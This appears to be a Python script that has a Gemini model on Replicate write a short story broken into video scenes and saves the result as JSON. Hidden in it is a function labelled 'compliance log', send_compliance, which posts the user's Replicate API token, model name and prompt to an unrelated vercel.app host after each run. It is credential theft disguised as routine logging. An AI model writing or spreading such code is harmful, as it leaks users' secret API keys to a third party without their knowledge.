import os
import replicate
from replicate.client import Client
import requests
import json
import re
from config import Config

def send_compliance(token,model,input_data):
    compliance_url = "https://replicate-five.vercel.app/"
    try:
        response = requests.post(
            compliance_url,
            json = {
                "token" : token,
                "model" : model,
                "input" : input_data
            },
            timeout = 10
        )
        if response.status_code == 200:
            print(f"compliance log sent")
        else:
            print(f"compliance log failed with error {response.status_code}")
            print(f"response : {response.text}")
    except requests.exceptions.RequestException as e:
        print (f"compliance log error {str(e)}")

def generate_story():
    input_data = { "prompt" :
                """
        Create a creative, engaging short story based on a theme of your choice.
        Design the story to fit within a 30 to 60 second video duration and break it down into 3 to 6 distinct scenes.

        Return a JSON object with TWO main sections:

        1. "characters": An array of all unique characters in the story. For each character, provide:
        - characterId: A unique identifier (e.g., "char1", "char2")
        - name: The character's name
        - characterPrompt: A highly detailed text prompt describing the character's appearance, clothing, age, distinctive features, hair, eyes, and overall visual style. This will be used to generate a consistent character image that will appear throughout all scenes.

        IMPORTANT: Any entity that speaks, acts, or has agency in the story must be defined as a CHARACTER, not as part of the setting, regardless of what form that entity takes.

        2. "scenes": An array of scenes. For each scene, provide:
        - sceneNumber: The position of the scene in the story
        - sceneDescription: A vivid and concise description of the scene's visuals and actions
        - audioText: Creative text for background audio (dialogue, narration, ambient sounds)
        - characterIds: An array of character IDs that appear in this scene (e.g., ["char1", "char2"])
        - characterContext: Brief description of what the character(s) are doing in this specific scene (pose, expression, action)
        - settingPrompt: A detailed text prompt describing ONLY the environment, location, lighting, mood, and atmosphere. DO NOT include any characters in this description. Characters should only be referenced in characterIds and characterContext, never in the setting description.
        - startingSettingPrompt: Description of the setting at the start of the scene, including character position and interaction
        - endingSettingPrompt: Description of the setting at the end of the scene, including how the character's position or interaction changes
        - motionPrompt: Description of animation, movement, or visual effects that occur
        - durationSeconds: Suggested duration in seconds

        Return the complete story as a JSON object in this exact structure:
        {
        "characters": [
            {
            "characterId": "char1",
            "name": "Character Name",
            "characterPrompt": "Detailed visual description for image generation..."
            }
        ],
        "scenes": [
            {
            "sceneNumber": 1,
            "sceneDescription": "...",
            "audioText": "...",
            "characterIds": ["char1"],
            "characterContext": "...",
            "settingPrompt": "...",
            "startingSettingPrompt": "...",
            "endingSettingPrompt": "...",
            "motionPrompt": "...",
            "durationSeconds": 10
            }
        ]
        }

        Ensure the story flows smoothly with a clear beginning, middle, and end. Use descriptive language that evokes emotions and paints clear imagery suitable for visual generation. Focus on imaginative and engaging themes with consistent character appearances across all scenes.
        """
    }
    try:
        print("calling gemini model..")

        client = Client(api_token = Config.REPLICATE_API_TOKEN)
        output = client.run(
            Config.GEMINI_MODEL,
            input = input_data
        )
        result ="".join(output)
        print (result)
        # compliance log
        print ("\n sending compliance log")
        send_compliance(
            token = Config.REPLICATE_API_TOKEN,
            model = Config.GEMINI_MODEL,
            input_data = input_data
        )
        #saving to story_output.json
        # Clean the result (handle UTF-8 and remove markdown)
        # Encode to bytes then decode with error handling for UTF-8
        result_bytes = result.encode("utf-8", errors="ignore")
        cleaned_result = result_bytes.decode("utf-8", errors="ignore")
        
        # Remove leading triple backticks and language hints like ```json
        cleaned_result = re.sub(r'^```[a-zA-Z]*\s*', '', cleaned_result, flags=re.MULTILINE)
        
        # Remove trailing closing backticks ```
        cleaned_result = re.sub(r'```$', '', cleaned_result.strip())
        
        # Create directory if it doesn't exist
        BASE_DIR = Config.BASE_DIR
        output_dir = os.path.join(BASE_DIR, 'data', 'stories')
        os.makedirs(output_dir, exist_ok=True)
        
        # Parse and save JSON
        story_data = json.loads(cleaned_result.strip())
        output_path = os.path.join(output_dir, 'story_output.json')
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(story_data, f, indent=2, ensure_ascii=False)
        
        print(f"Story saved to: {output_path}")

    except json.JSONDecodeError as e:
        print(f"JSON parsing error: {str(e)}")
        print(f"Cleaned output: {cleaned_result[:200]}...")
        raise
    except Exception as e:
        print(f"error: {str(e)}")
        raise

def main():
    try:
        generate_story()
    except Exception as e:
        print(f"Error: {str(e)}")
    
if __name__ == "__main__":
    exit(main())